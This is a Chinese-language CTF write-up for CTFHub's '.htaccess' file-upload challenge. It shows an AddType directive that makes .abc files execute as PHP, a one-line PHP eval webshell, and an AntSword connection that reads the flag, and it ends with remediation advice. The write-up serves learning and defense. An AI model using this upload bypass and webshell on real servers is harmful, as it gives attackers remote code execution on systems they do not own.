# 2026-10-31-ctfhub-htaccess.md
## 题目信息
题目：.htaccess
分类：Web-文件上传
平台：CTFHub
解题奖励：金币50，经验5

## 解题思路
本题考点是Apache的.htaccess配置文件。先上传.htaccess文件，设置自定义解析规则，让指定后缀文件当作php解析，再上传对应后缀的一句话木马文件，使用蚁剑连接WebShell读取flag。

## 复现步骤
1. 开启题目，进入文件上传页面。
2. 新建.htaccess文件，写入配置：
AddType application/x-httpd-php .abc
含义：把后缀为.abc的文件按照php代码解析执行。
3. 上传.htaccess配置文件。
4. 创建shell.abc，写入一句话木马：
```php
<?php @eval($_POST['cmd']);?>
5. 上传shell.abc，拿到上传后的访问路径。

6. 打开蚁剑添加连接，URL填写靶机地址+上传路径，密码cmd，连接类型PHP。

7. 连接成功，浏览服务器文件读取flag，提交。

漏洞原理

Apache服务器支持.htaccess目录配置文件，攻击者上传自定义的.htaccess，修改解析规则，让非php后缀文件被当作php脚本解析执行，从而绕过后缀黑名单上传webshell。

修复建议

1. 禁止上传.htaccess文件。

2. 配置Apache，不允许使用.htaccess覆盖配置。

3. 使用后端后缀白名单校验。

4. 上传目录禁止脚本解析权限。

5. 上传文件随机重命名。

学习到的知识

了解Apache中.htaccess文件的作用，学会利用AddType指令修改文件解析规则，掌握文件上传中修改解析方式的绕过思路，理解不同Web服务器解析差异。